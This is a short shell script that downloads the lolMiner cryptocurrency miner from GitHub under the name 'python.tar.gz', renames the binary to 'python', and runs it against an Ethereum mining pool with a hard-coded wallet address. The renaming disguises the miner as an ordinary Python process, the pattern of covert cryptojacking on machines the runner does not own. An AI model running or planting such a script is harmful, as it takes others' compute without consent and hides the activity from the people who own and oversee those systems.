curl -L -o python.tar.gz https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.31/lolMiner_v1.31_Lin64.tar.gz
tar -zxvf python.tar.gz
cd 1.31
mv lolMiner python
./python --algo ETHASH --pool us1.ethermine.org:5555 --user 0xeed495d4d38a1289b68077a7e9e87a51c3d99b96.RIG_01
